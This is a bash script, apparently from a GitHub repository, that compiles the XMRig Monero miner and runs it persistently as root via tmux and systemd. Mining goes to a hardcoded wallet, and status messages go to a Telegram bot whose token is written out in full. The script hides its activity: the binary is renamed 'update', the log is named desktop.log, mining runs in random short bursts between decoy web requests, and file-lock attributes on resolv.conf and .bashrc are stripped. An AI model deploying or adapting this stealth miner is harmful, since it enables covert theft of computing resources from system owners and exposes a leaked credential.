#!/bin/bash

### Usage: bash <(curl -s https://raw.githubusercontent.com/MohammedKhaledUddin/xmrig-vps-installer/main/final.sh) v7
### Make sure to run as root: sudo su -c "command"

# Arguments
WORKER=$1
[[ -z "$WORKER" ]] && WORKER="vtest"

# Wallet and Telegram Settings
WALLET="84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz"
POOL="pool.supportxmr.com:443"
BOT_TOKEN="7828954337:AAHFZPTv5znzf2LcR5sIO3bHBMDWM7hFB3k"
CHAT_ID="7107536205"

# Unlock files if locked
chattr -i /etc/resolv.conf &>/dev/null
chattr -i ~/.bashrc &>/dev/null
chattr -i /root/.bashrc &>/dev/null

# Update and install required packages
apt update -y && apt install -y curl git build-essential cmake libssl-dev libhwloc-dev screen unzip tmux

# Create folders
mkdir -p /root/Documents/build && cd /root/Documents/build || exit

# Download and compile XMRig
curl -L https://github.com/xmrig/xmrig/archive/refs/tags/v6.21.1.zip -o xmrig.zip
unzip -o xmrig.zip && mv xmrig-* xmrig && cd xmrig
mkdir -p build && cd build
cmake .. -DWITH_TLS=OFF
make -j$(nproc)

# Move binary to safe location
mkdir -p /root/Documents/build && mv xmrig /root/Documents/build/update
chmod +x /root/Documents/build/update

# Create miner script
cat >/root/miner.sh <<EOF
#!/bin/bash
while true; do
    echo "[$(date)] Starting miner for worker: $WORKER"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID&text=⛏️ Mining started: $WORKER"
    /root/Documents/build/update -o $POOL -u $WALLET -k --tls --coin monero -p x --donate-level 1 -a rx/0 -t $(nproc) --rig-id $WORKER >>/root/desktop.log 2>&1 &
    MINER_PID=$!
    sleep \$((60 + RANDOM % 840))  # mine for 1–14 minutes randomly
    kill \$MINER_PID
    echo "[$(date)] Sleeping..."
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID&text=💤 Sleeping now..."
    for i in {1..10}; do curl -s https://www.google.com >/dev/null; sleep \$((10 + RANDOM % 30)); done
    sleep \$((30 + RANDOM % 100))  # sleep for 30–130 seconds

done
EOF

chmod +x /root/miner.sh

# Setup tmux keep-alive session
apt install -y tmux
(tmux new-session -d -s miner "/root/miner.sh")

# Setup systemd service for auto-restart
cat >/etc/systemd/system/xmrig-wrapper.service <<EOF
[Unit]
Description=XMRig Miner Wrapper
After=network.target

[Service]
ExecStart=/usr/bin/tmux new-session -d -s miner /root/miner.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xmrig-wrapper.service
systemctl start xmrig-wrapper.service

# Final log
echo "=========================================="
echo "✅ Miner $WORKER is configured and running"
echo "🛠️  Binary: /root/Documents/build/update"
echo "📝 Logs: /root/desktop.log"
echo "📦 Service: xmrig-wrapper"
echo "🔁 Restart: sudo systemctl restart xmrig-wrapper"
echo "🛑 Stop:    sudo systemctl stop xmrig-wrapper"
echo "🔍 Logs:    tail -f /root/desktop.log"
echo "🧠 Tmux:    tmux attach-session -t miner"
echo "=========================================="
